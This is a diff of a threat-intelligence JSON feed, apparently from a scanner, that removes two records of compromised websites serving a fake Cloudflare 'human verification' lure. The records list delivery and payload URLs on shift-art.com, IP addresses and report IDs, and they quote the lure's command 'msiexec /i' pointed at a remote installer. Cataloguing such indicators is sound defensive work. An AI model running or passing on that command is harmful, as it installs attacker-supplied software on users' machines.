@@ -7251,53 +7251,5 @@
     ],
     "ReportId": "cmwif9m880ztz0oml69lmb145",
     "ScannedAt": "2026-11-15T22:44:38.790000+00:00"
-  },
-  {
-    "UrlDomain": "garrygolden.net",
-    "DeliveryUrl": [
-      "shift-art.com"
-    ],
-    "PayloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "IP": [
-      "162.241.217.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
-    "ResolvedDownloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "ReportId": "cmwicn28d0ztc0oml2lvkp9eu",
-    "ScannedAt": "2026-11-15T21:31:07.231000+00:00"
-  },
-  {
-    "UrlDomain": "www.tampilkan.com",
-    "DeliveryUrl": [
-      "shift-art.com"
-    ],
-    "PayloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "IP": [
-      "194.5.152.128"
-    ],
-    "Related": [
-      {
-        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
-    "ResolvedDownloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "ReportId": "cmwibrmxl0zoa0omlbyzngmgj",
-    "ScannedAt": "2026-11-15T21:06:41.001000+00:00"
   }
 ]
